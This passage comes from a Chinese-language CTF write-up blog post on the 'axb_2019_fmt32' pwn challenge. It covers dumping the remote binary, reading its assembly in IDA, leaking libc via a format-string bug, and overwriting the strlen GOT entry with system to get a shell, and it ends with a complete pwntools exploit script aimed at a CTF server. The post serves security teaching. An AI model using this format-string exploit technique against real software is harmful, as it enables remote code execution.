<span class="keyword">if</span> isDisconnect == <span class="literal">True</span>: <span class="comment">#断开重新连接.</span></span><br><span class="line">			print(<span class="string">&#x27;Error.&#x27;</span>)</span><br><span class="line">			io = remote(remoteIp, remotePort)</span><br><span class="line">			isDisconnect = <span class="literal">False</span></span><br><span class="line">			sleep(<span class="number">0.5</span>)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	f.close()</span><br><span class="line">	io.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	getbinary()	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	exploit()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就静静的等待,若开启输出太多加上是远程dump,可能一个小时都还没dump 10k,尽量关掉输出.</p>
<p>dump文件之后如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logan@LYXF:~/share/axb_fmt1$ cat binary</span><br><span class="line">ELF�<span class="number">4</span>`<span class="number">4</span> 	(<span class="number">44</span>�<span class="number">4</span>�  TT�T����	�	�<span class="number">4</span>d����hh�h�DDP�td����,,Q�tdR�</span><br><span class="line"><span class="meta">... </span>...</span><br></pre></td></tr></table></figure>

<h3 id="IDA分析dump的文件"><a href="#IDA分析dump的文件" class="headerlink" title="IDA分析dump的文件"></a>IDA分析dump的文件</h3><p>所dump的文件不能反编译为c语言伪代码,只能看汇编.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_init_proc	LOAD	08048418	00000023	0000000C	00000000	R	.	.	.	.	.	.</span><br><span class="line">sub_8048450	LOAD	08048450	00000006			R	.	.	.	.	.	.</span><br><span class="line">sub_8048460	LOAD	08048460	00000006			R	.	.	.	.	.	.</span><br><span class="line">sub_8048470	LOAD	08048470	00000006			R	.	.	.	.	.	.</span><br><span class="line">j_start	LOAD	08048480	00000006			.	.	.	.	.	.	.</span><br><span class="line">sub_8048490	LOAD	08048490	00000006			R	.	.	.	.	.	.</span><br><span class="line">sub_80484A0	LOAD	080484A0	00000006			R	.	.	.	.	.	.</span><br><span class="line">sub_80484B0	LOAD	080484B0	00000006			R	.	.	.	.	.	.</span><br><span class="line">sub_80484C0	LOAD	080484C0	00000006			R	.	.	.	.	.	.</span><br><span class="line">sub_80484D0	LOAD	080484D0	00000006			R	.	.	.	.	.	.</span><br><span class="line">sub_80484E0	LOAD	080484E0	00000006			R	.	.	.	.	.	.</span><br><span class="line">__gmon_start__	LOAD	080484F0	00000006			R	.	.	.	.	.	.</span><br><span class="line">start	LOAD	08048500	00000022			.	.	.	.	.	.	.</span><br><span class="line">sub_8048530	LOAD	08048530	00000004	00000000	00000000	R	.	.	.	.	.	.</span><br><span class="line">sub_8048540	LOAD	08048540	0000002B	00000000	00000000	R	.	.	.	.	.	.</span><br><span class="line">sub_80485B0	LOAD	080485B0	0000001E	00000000	00000000	R	.	.	.	.	.	.</span><br><span class="line">sub_80485D0	LOAD	080485D0	0000002B			R	.	.	.	.	.	.</span><br><span class="line">sub_8048760	LOAD	08048760	0000005D	00000010	0000000C	R	.	.	.	.	.	.</span><br><span class="line">nullsub_1	LOAD	080487C0	00000002	00000000	00000000	R	.	.	.	.	.	.</span><br><span class="line">_term_proc	LOAD	080487C4	00000014	0000000C	00000000	R	.	.	.	.	.	.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以看到,基本的函数也出来了, 但没有发现main函数,找相关逻辑代码吧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080486AD                 lea     eax, [ebp-138h]</span><br><span class="line">LOAD:080486B3                 push    eax</span><br><span class="line">LOAD:080486B4                 call    sub_80484D0</span><br><span class="line">LOAD:080486B9                 add     esp, 10h</span><br><span class="line">LOAD:080486BC                 sub     esp, 0Ch</span><br><span class="line">LOAD:080486BF                 push    offset aPleaseTellMe ; &quot;Please tell me:&quot;</span><br><span class="line">LOAD:080486C4                 call    sub_8048470     </span><br><span class="line">LOAD:080486C9                 add     esp, 10h</span><br><span class="line">LOAD:080486CC                 sub     esp, 4</span><br><span class="line">LOAD:080486CF                 push    100h</span><br><span class="line">LOAD:080486D4                 lea     eax, [ebp-239h]</span><br><span class="line">LOAD:080486DA                 push    eax</span><br><span class="line">LOAD:080486DB                 push    0</span><br><span class="line">LOAD:080486DD                 call    sub_8048460     </span><br><span class="line">LOAD:080486E2                 add     esp, 10h</span><br><span class="line">LOAD:080486E5                 sub     esp, 4</span><br><span class="line">LOAD:080486E8                 lea     eax, [ebp-239h]</span><br><span class="line">LOAD:080486EE                 push    eax</span><br><span class="line">LOAD:080486EF                 push    offset aRepeaterS ; &quot;Repeater:%s\n&quot;</span><br><span class="line">LOAD:080486F4                 lea     eax, [ebp-138h]</span><br><span class="line">LOAD:080486FA                 push    eax</span><br><span class="line">LOAD:080486FB                 call    sub_80484E0     </span><br><span class="line">LOAD:08048700                 add     esp, 10h</span><br><span class="line">LOAD:08048703                 sub     esp, 0Ch</span><br><span class="line">LOAD:08048706                 lea     eax, [ebp-138h]</span><br><span class="line">LOAD:0804870C                 push    eax</span><br><span class="line">LOAD:0804870D                 call    sub_80484B0     </span><br><span class="line">LOAD:08048712                 add     esp, 10h</span><br><span class="line">LOAD:08048715                 mov     [ebp-240h], eax </span><br><span class="line">LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10E</span><br><span class="line">LOAD:08048725                 jbe     short loc_8048741</span><br><span class="line">LOAD:08048727                 sub     esp, 0Ch</span><br><span class="line">LOAD:0804872A                 push    offset aWhatYouInputIs ; &quot;what you input is really long!&quot;</span><br><span class="line">LOAD:0804872F                 call    sub_8048470</span><br><span class="line">LOAD:08048734                 add     esp, 10h</span><br><span class="line">LOAD:08048737                 sub     esp, 0Ch</span><br><span class="line">LOAD:0804873A                 push    0</span><br><span class="line">LOAD:0804873C                 call    sub_80484A0</span><br></pre></td></tr></table></figure>

<p>虽然找到,但不知道调用什么函数, 需要去看看符号表.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">extern:0804A06C ; extern</span><br><span class="line">extern:0804A06C ; void setbuf(FILE *stream, char *buf)</span><br><span class="line">extern:0804A06C                 extrn setbuf:near</span><br><span class="line">extern:0804A070 ; ssize_t read(int fd, void *buf, size_t nbytes)</span><br><span class="line">extern:0804A070                 extrn read:near</span><br><span class="line">extern:0804A074 ; int printf(const char *format, ...)</span><br><span class="line">extern:0804A074                 extrn printf:near</span><br><span class="line">extern:0804A078 ; unsigned int alarm(unsigned int seconds)</span><br><span class="line">extern:0804A078                 extrn alarm:near</span><br><span class="line">extern:0804A07C ; int puts(const char *s)</span><br><span class="line">extern:0804A07C                 extrn puts:near</span><br><span class="line">extern:0804A080 ; void exit(int status)</span><br><span class="line">extern:0804A080                 extrn exit:near</span><br><span class="line">extern:0804A084 ; size_t strlen(const char *s)</span><br><span class="line">extern:0804A084                 extrn strlen:near</span><br><span class="line">extern:0804A088 ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)</span><br><span class="line">extern:0804A088                 extrn __libc_start_main:near</span><br><span class="line">extern:0804A08C ; void *memset(void *s, int c, size_t n)</span><br><span class="line">extern:0804A08C                 extrn memset:near</span><br><span class="line">extern:0804A090 ; int sprintf(char *s, const char *format, ...)</span><br><span class="line">extern:0804A090                 extrn sprintf:near</span><br><span class="line">extern:0804A094                 extrn __imp___gmon_start__:near ; weak</span><br><span class="line">extern:0804A094                                         ; CODE XREF: __gmon_start__↑j</span><br></pre></td></tr></table></figure>

<p>这就需要推断调用什么函数了.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080486AD                 lea     eax, [ebp-138h]</span><br><span class="line">LOAD:080486B3                 push    eax</span><br><span class="line">LOAD:080486B4                 call    sub_80484D0</span><br><span class="line">LOAD:080486B9                 add     esp, 10h</span><br><span class="line">LOAD:080486BC                 sub     esp, 0Ch</span><br><span class="line">LOAD:080486BF                 push    offset aPleaseTellMe ; &quot;Please tell me:&quot;</span><br><span class="line">LOAD:080486C4                 call    sub_8048470   &#x2F;&#x2F; puts函数</span><br><span class="line">LOAD:080486C9                 add     esp, 10h</span><br><span class="line">LOAD:080486CC                 sub     esp, 4</span><br><span class="line">LOAD:080486CF                 push    100h &#x2F;&#x2F; length</span><br><span class="line">LOAD:080486D4                 lea     eax, [ebp-239h]</span><br><span class="line">LOAD:080486DA                 push    eax  &#x2F;&#x2F; buf</span><br><span class="line">LOAD:080486DB                 push    0    &#x2F;&#x2F;fd</span><br><span class="line">LOAD:080486DD                 call    sub_8048460     &#x2F;&#x2F;read 函数</span><br><span class="line">LOAD:080486E2                 add     esp, 10h</span><br><span class="line">LOAD:080486E5                 sub     esp, 4</span><br><span class="line">LOAD:080486E8                 lea     eax, [ebp-239h]</span><br><span class="line">LOAD:080486EE                 push    eax &#x2F;&#x2F; buf</span><br><span class="line">LOAD:080486EF                 push    offset aRepeaterS ; &quot;Repeater:%s\n&quot; &#x2F;&#x2F;arg 2</span><br><span class="line">LOAD:080486F4                 lea     eax, [ebp-138h]</span><br><span class="line">LOAD:080486FA                 push    eax  &#x2F;&#x2F;buf2</span><br><span class="line">LOAD:080486FB                 call    sub_80484E0  &#x2F;&#x2F;sprintf函数   </span><br><span class="line">LOAD:08048700                 add     esp, 10h</span><br><span class="line">LOAD:08048703                 sub     esp, 0Ch</span><br><span class="line">LOAD:08048706                 lea     eax, [ebp-138h] </span><br><span class="line">LOAD:0804870C                 push    eax &#x2F;&#x2F;buf2</span><br><span class="line">LOAD:0804870D                 call    sub_80484B0      &#x2F; &#x2F;strlen函数,传入buf2</span><br><span class="line">LOAD:08048712                 add     esp, 10h</span><br><span class="line">LOAD:08048715                 mov     [ebp-240h], eax ; &#x2F;&#x2F;srlen函数的返回值 </span><br><span class="line">LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10E</span><br><span class="line">LOAD:08048725                 jbe     short loc_8048741</span><br><span class="line">LOAD:08048727                 sub     esp, 0Ch</span><br><span class="line">LOAD:0804872A                 push    offset aWhatYouInputIs ; &quot;what you input is really long!&quot;</span><br><span class="line">LOAD:0804872F                 call    sub_8048470</span><br><span class="line">LOAD:08048734                 add     esp, 10h</span><br><span class="line">LOAD:08048737                 sub     esp, 0Ch</span><br><span class="line">LOAD:0804873A                 push    0</span><br><span class="line">LOAD:0804873C                 call    sub_80484A0</span><br></pre></td></tr></table></figure>

<h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>泄漏libc的话,只需泄漏某个函数的got表,就选择sprintf来泄漏吧, 点击sprintf的call sub_80484E0进入plt跳转.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080484E0 sub_80484E0     proc near               ; CODE XREF: LOAD:080486FB↓p</span><br><span class="line">LOAD:080484E0                 jmp     ds:dword_804A030</span><br><span class="line">LOAD:080484E0 sub_80484E0     endp</span><br></pre></td></tr></table></figure>

<p>点击jmp到sprintf got 表地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804A030 dword_804A030   dd 1C001Fh              ; DATA XREF: sub_80484E0↑r</span><br></pre></td></tr></table></figure>

<p>0x0804A030就是sprintf的got表地址了,那么我们就可以通过字符串漏洞泄漏该地址的内容,从而获取到libc中sprintf的地址,strlen也是同样的方法.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sprintf_got = <span class="number">0x0804A030</span>	</span><br><span class="line">strlen_got = <span class="number">0x0804A024</span></span><br><span class="line">offset = <span class="number">8</span></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">p = <span class="string">&#x27;A&#x27;</span> <span class="comment"># for alignment</span></span><br><span class="line">p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">1</span>) + <span class="string">&#x27;$s&#x27;</span> + p32(sprintf_got)</span><br><span class="line">s(p)</span><br><span class="line">sprintf = u32(ru(<span class="string">&#x27;\xf7&#x27;</span>)[<span class="number">-3</span>:] + <span class="string">&#x27;\xf7&#x27;</span>)</span><br><span class="line">li(<span class="string">&#x27;sprintf &#x27;</span> + <span class="built_in">hex</span>(sprintf))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">select:</span></span><br><span class="line"><span class="string">2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;sprintf&#x27;</span>, sprintf)</span><br><span class="line">libc_base = sprintf - libc.dump(<span class="string">&#x27;sprintf&#x27;</span>)</span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">li(<span class="string">&#x27;system &#x27;</span> + <span class="built_in">hex</span>(system))</span><br></pre></td></tr></table></figure>

<h4 id="修改strlen的got表内容为system"><a href="#修改strlen的got表内容为system" class="headerlink" title="修改strlen的got表内容为system"></a>修改strlen的got表内容为system</h4><p>使用字符串漏洞来进行地址写入, 使用’$hn’s 2字节分两次写入,先写小的再写大的, system的高位地址要比system的低位地址大,则先写小的.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">high_sys = system &gt;&gt; (<span class="number">8</span> * <span class="number">2</span>) <span class="comment">#获取高4位</span></span><br><span class="line">low_sys = system &amp; <span class="number">0xFFFF</span>    <span class="comment">#获取低4位</span></span><br><span class="line">li(<span class="string">&#x27;high_sys &#x27;</span> + <span class="built_in">hex</span>(high_sys))</span><br><span class="line">li(<span class="string">&#x27;low_sys  &#x27;</span> + <span class="built_in">hex</span>(low_sys))</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify strlen got</span></span><br><span class="line">pre_len = <span class="built_in">len</span>(<span class="string">&#x27;Repeater:&#x27;</span>) + <span class="number">1</span> + <span class="number">4</span> + <span class="number">4</span> <span class="comment">#这里为数据已经打印的长度,后面写入长度需要减掉该长度</span></span><br><span class="line">p = <span class="string">&#x27;A&#x27;</span> <span class="comment"># for alignment</span></span><br><span class="line">p += p32(strlen_got + <span class="number">0</span>) <span class="comment"># 8</span></span><br><span class="line">p += p32(strlen_got + <span class="number">2</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(low_sys - pre_len) + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">0</span>) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(high_sys - low_sys) + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">1</span>) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">   s(p)</span><br></pre></td></tr></table></figure>

<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><p>使用’; ‘分割shell命令, 再调用strlen即调用system函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="string">&#x27;; /bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;node3.buuoj.cn&quot;</span></span><br><span class="line">remotePort = <span class="number">29458</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIB   = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	sprintf_got = <span class="number">0x0804A030</span>	</span><br><span class="line">	strlen_got = <span class="number">0x0804A024</span></span><br><span class="line">	offset = <span class="number">8</span></span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> <span class="comment"># for alignment</span></span><br><span class="line">	p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">1</span>) + <span class="string">&#x27;$s&#x27;</span> + p32(sprintf_got)</span><br><span class="line">	s(p)</span><br><span class="line">	sprintf = u32(ru(<span class="string">&#x27;\xf7&#x27;</span>)[<span class="number">-3</span>:] + <span class="string">&#x27;\xf7&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;sprintf &#x27;</span> + <span class="built_in">hex</span>(sprintf))</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	select:</span></span><br><span class="line"><span class="string">	2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">	libc = LibcSearcher(<span class="string">&#x27;sprintf&#x27;</span>, sprintf)</span><br><span class="line">	libc_base = sprintf - libc.dump(<span class="string">&#x27;sprintf&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	li(<span class="string">&#x27;system &#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">	high_sys = system &gt;&gt; (<span class="number">8</span> * <span class="number">2</span>)</span><br><span class="line">	low_sys = system &amp; <span class="number">0xFFFF</span></span><br><span class="line">	li(<span class="string">&#x27;high_sys &#x27;</span> + <span class="built_in">hex</span>(high_sys))</span><br><span class="line">	li(<span class="string">&#x27;low_sys  &#x27;</span> + <span class="built_in">hex</span>(low_sys))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># modify strlen got</span></span><br><span class="line">	pre_len = <span class="built_in">len</span>(<span class="string">&#x27;Repeater:&#x27;</span>) + <span class="number">1</span> + <span class="number">4</span> + <span class="number">4</span></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> <span class="comment"># for alignment</span></span><br><span class="line">	p += p32(strlen_got + <span class="number">0</span>) <span class="comment"># 8</span></span><br><span class="line">	p += p32(strlen_got + <span class="number">2</span>) <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">	p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(low_sys - pre_len) + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">0</span>) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line">	p += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(high_sys - low_sys) + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(offset + <span class="number">1</span>) + <span class="string">&#x27;$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">	s(p)</span><br><span class="line">	sl(<span class="string">&#x27;; /bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/24/wp-axb-2019-fmt32/" data-id="ckhemv84o005kwdcmdfca9ykq" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-vn-easy-theap" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/22/wp-vn-easy-theap/" class="article-date">
  <time datetime="2020-04-22T13:34:46.000Z" itemprop="datePublished">2020-04-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
